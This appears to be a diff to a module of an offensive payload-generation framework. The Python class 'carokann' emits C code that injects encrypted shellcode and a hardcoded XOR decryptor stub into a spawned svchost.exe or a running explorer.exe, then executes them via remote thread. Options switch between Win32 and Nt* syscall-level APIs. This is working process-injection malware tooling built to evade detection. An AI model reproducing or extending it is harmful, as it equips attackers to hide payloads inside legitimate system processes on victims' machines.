@@ -5,12 +5,71 @@ from c.utils.functions import *
 class carokann:
     def __init__(self, arguments):
         self.memoryPermission = 'PAGE_EXECUTE_READ'
-        self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
         if 'perm' in arguments:
             if arguments['perm'] == 'rwx':
                 self.memoryPermission = 'PAGE_EXECUTE_READWRITE'
+
+        self.mode = 'spawn'
+        if 'mode' in arguments:
+            if arguments['mode'] in ['inject', 'spawn']:
+                self.mode = arguments['mode']
+
+        if self.mode == 'inject':
+            self.target = 'explorer.exe'
+        elif self.mode == 'spawn':
+            self.target = 'C:\\\\windows\\\\system32\\\\svchost.exe'
+
         if 'target' in arguments:
-            self.target = arguments['target']
+            self.target = arguments['target'].replace('\\','\\\\')
+
+        self.spawn = 'CreateProcessA'
+        if 'spawn' in arguments:
+            if arguments['spawn'] in ['CreateProcessA', 'NtCreateUserProcess']:
+                self.spawn = arguments['spawn']
+            else:
+                print('Spawn argument must be CreateProcessA, or NtCreateUserProcess')
+                exit(0)
+
+        self.allocate = 'VirtualAllocEx'
+        if 'allocate' in arguments:
+            if arguments['allocate'] in ['VirtualAllocEx', 'NtAllocateVirtualMemory']:
+                self.allocate = arguments['allocate']
+            else:
+                print('allocate argument must be VirtualAllocEx, or NtAllocateVirtualMemory')
+                exit(0)
+
+        self.write = 'WriteProcessMemory'
+        if 'write' in arguments:
+            if arguments['write'] in ['WriteProcessMemory', 'NtWriteVirtualMemory']:
+                self.write = arguments['write']
+            else:
+                print('Write argument must be WriteProcessMemory, or NtWriteVirtualMemory')
+                exit(0)
+
+        self.protect = 'VirtualProtectEx'
+        if 'protect' in arguments:
+            if arguments['protect'] in ['VirtualProtectEx', 'NtProtectVirtualMemory']:
+                self.protect = arguments['protect']
+            else:
+                print('Protect argument must be WaitForSingleObject or NtWaitForSingleObject')
+                exit(0)
+
+        self.execute = 'CreateRemoteThread'
+        if 'execute' in arguments:
+            if arguments['execute'] in ['CreateRemoteThread', 'NtCreateThreadEx']:
+                self.execute = arguments['execute']
+            else:
+                print('execute argument must be CreateRemoteThread, or NtCreateThreadEx')
+                exit(0)
+
+        self.wait = 'WaitForSingleObject'
+        if 'wait' in arguments:
+            if arguments['wait'] in ['WaitForSingleObject', 'NtWaitForSingleObject']:
+                self.wait = arguments['wait']
+            else:
+                print('Wait argument must be WaitForSingleObject, or NtWaitForSingleObject')
+                exit(0)
+
         self.decryptor = b'\x56\x48\x89\xe6\x48\x83\xe4\xf0\x48\x83\xec\x20\xe8\x3e\x00\x00\x00\x48\x89\xf4\x5e\xc3\x66\x2e\x0f\x1f\x84\x00\x00\x00\x00\x00\x89\xd2\x31\xc0\x49\x89\xd0\x49\xc1\xe8\x02\x4c\x39\xc0\x74\x0c\x81\x34\x81\x01\x02\x03\x04\x48\xff\xc0\xeb\xef\x48\xc1\xe0\x02\x48\x39\xc2\x76\x09\x80\x34\x01\x01\x48\xff\xc0\xeb\xf2\xc3\x41\x55\x41\x54\x56\x53\x48\x8d\x59\x08\x48\x83\xec\x38\x4c\x8b\x29\xb9\xf0\x1d\xd3\xad\xc7\x44\x24\x2c\x00\x00\x00\x00\xe8\xbe\x00\x00\x00\x48\x85\xc0\x74\x25\x49\x89\xc4\xba\x7e\xcd\x07\x0e\x48\x89\xc1\xe8\xfa\x00\x00\x00\x4c\x89\xe1\xba\x0d\x50\x57\xe8\x48\x89\xc6\xe8\xea\x00\x00\x00\x49\x89\xc4\xeb\x05\x45\x31\xe4\x31\xf6\xb9\x60\xea\x00\x00\xff\xd6\x48\x89\xd9\x44\x89\xea\x4c\x8d\x4c\x24\x2c\xe8\x68\xff\xff\xff\x4c\x89\xea\x41\xb8\x20\x00\x00\x00\x41\xff\xd4\xff\xd3\x48\x83\xc4\x38\x5b\x5e\x41\x5c\x41\x5d\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x49\x89\xc9\xb8\x05\x15\x00\x00\x45\x8a\x01\x48\x85\xd2\x75\x06\x45\x84\xc0\x75\x16\xc3\x45\x89\xca\x41\x29\xca\x49\x39\xd2\x73\x23\x45\x84\xc0\x75\x05\x49\xff\xc1\xeb\x0a\x41\x80\xf8\x60\x76\x04\x41\x83\xe8\x20\x6b\xc0\x21\x45\x0f\xb6\xc0\x49\xff\xc1\x44\x01\xc0\xeb\xc4\xc3\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x57\x56\x48\x89\xce\x53\x48\x83\xec\x20\x65\x48\x8b\x04\x25\x60\x00\x00\x00\x48\x8b\x40\x18\x48\x8b\x78\x20\x48\x89\xfb\x0f\xb7\x53\x48\x48\x8b\x4b\x50\xe8\x85\xff\xff\xff\x89\xc0\x48\x39\xf0\x75\x06\x48\x8b\x43\x20\xeb\x11\x48\x8b\x1b\x48\x85\xdb\x74\x05\x48\x39\xdf\x75\xd9\x48\x83\xc8\xff\x48\x83\xc4\x20\x5b\x5e\x5f\xc3\x41\x57\x41\x56\x49\x89\xd6\x41\x55\x41\x54\x55\x31\xed\x57\x56\x53\x48\x89\xcb\x48\x83\xec\x28\x48\x63\x41\x3c\x8b\xbc\x08\x88\x00\x00\x00\x48\x01\xcf\x44\x8b\x7f\x20\x44\x8b\x67\x1c\x44\x8b\x6f\x24\x49\x01\xcf\x39\x6f\x18\x76\x31\x89\xee\x31\xd2\x41\x8b\x0c\xb7\x48\x01\xd9\xe8\x15\xff\xff\xff\x4c\x39\xf0\x75\x18\x48\x01\xf6\x48\x01\xde\x42\x0f\xb7\x04\x2e\x48\x8d\x04\x83\x42\x8b\x04\x20\x48\x01\xd8\xeb\x04\xff\xc5\xeb\xca\x48\x83\xc4\x28\x5b\x5e\x5f\x5d\x41\x5c\x41\x5d\x41\x5e\x41\x5f\xc3\x90\x90\x90\xe8\x00\x00\x00\x00\x58\x48\x83\xe8\x05\xc3\x0f\x1f\x44\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
         self.decryptorLength = len(self.decryptor)
 
@@ -28,28 +87,46 @@ class carokann:
 """
 
     def template(self) -> str:
-        """
         template = '{transformers}'
         template += 'SIZE_T shellcodeSize = {shellcodeSize};'
-        template += CreateProcessA('C:\\\\windows\\\\system32\\\\svchost.exe')
-        template += VirtualAllocEx('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
-        template += WriteProcessMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
-        template += WriteProcessMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
-        template += VirtualAllocEx('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
-        template += WriteProcessMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
-        template += VirtualProtectEx('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
-        template += CreateRemoteThread('newThread', 'hProcess', 'pDecryptor', 'buffer')
-        template += WaitForSingleObject('newThread', 'INFINITE')
-        """
-        template = '{transformers}'
-        template += 'SIZE_T shellcodeSize = {shellcodeSize};'
-        template += NtCreateUserProcess(self.target)
-        template += NtAllocateVirtualMemory('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
-        template += NtWriteVirtualMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
-        template += NtWriteVirtualMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
-        template += NtAllocateVirtualMemory('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
-        template += NtWriteVirtualMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
-        template += NtProtectVirtualMemory('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
-        template += NtCreateThreadEx('newThread', 'hProcess', 'pDecryptor', 'buffer')
-        template += NtWaitForSingleObject('newThread', 'INFINITE')
+
+        if self.mode == 'spawn':
+            if self.spawn == 'CreateProcessA':
+                template += CreateProcessA('C:\\\\windows\\\\system32\\\\svchost.exe')
+            elif self.spawn == 'NtCreateUserProcess':
+                template += NtCreateUserProcess(self.target)
+        elif self.mode == 'inject':
+            template += FindProcess(self.target)
+
+        if self.allocate == 'VirtualAllocEx':
+            template += VirtualAllocEx('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
+            template += VirtualAllocEx('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
+        elif self.allocate == 'NtAllocateVirtualMemory':
+            template += NtAllocateVirtualMemory('buffer', 'hProcess', 'shellcodeSize + sizeof(SIZE_T)', 'MEM_COMMIT', 'PAGE_READWRITE')
+            template += NtAllocateVirtualMemory('pDecryptor', 'hProcess', self.decryptorLength, 'MEM_COMMIT', 'PAGE_READWRITE')
+
+        if self.write == 'WriteProcessMemory':
+            template += WriteProcessMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
+            template += WriteProcessMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
+            template += WriteProcessMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
+        elif self.write == 'NtWriteVirtualMemory':
+            template += NtWriteVirtualMemory('hProcess', 'buffer', '&shellcodeSize', 'sizeof(SIZE_T)')
+            template += NtWriteVirtualMemory('hProcess', 'buffer + sizeof(SIZE_T)', 'shellcode', 'shellcodeSize')
+            template += NtWriteVirtualMemory('hProcess', 'pDecryptor', 'decryptor', self.decryptorLength)
+
+        if self.protect == 'VirtualProtectEx':
+            template += VirtualProtectEx('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
+        elif self.protect == 'NtProtectVirtualMemory':
+            template += NtProtectVirtualMemory('hProcess', 'pDecryptor', self.decryptorLength, 'PAGE_EXECUTE_READ')
+
+        if self.execute == 'CreateRemoteThread':
+            template += CreateRemoteThread('newThread', 'hProcess', 'pDecryptor', 'buffer')
+        elif self.execute == 'NtCreateThreadEx':
+            template += NtCreateThreadEx('newThread', 'hProcess', 'pDecryptor', 'buffer')
+
+        if self.wait == 'WaitForSingleObject':
+            template += WaitForSingleObject('newThread', 'INFINITE')
+        elif self.wait == 'NtWaitForSingleObject':
+            template += NtWaitForSingleObject('newThread', 'INFINITE')
+
         return template
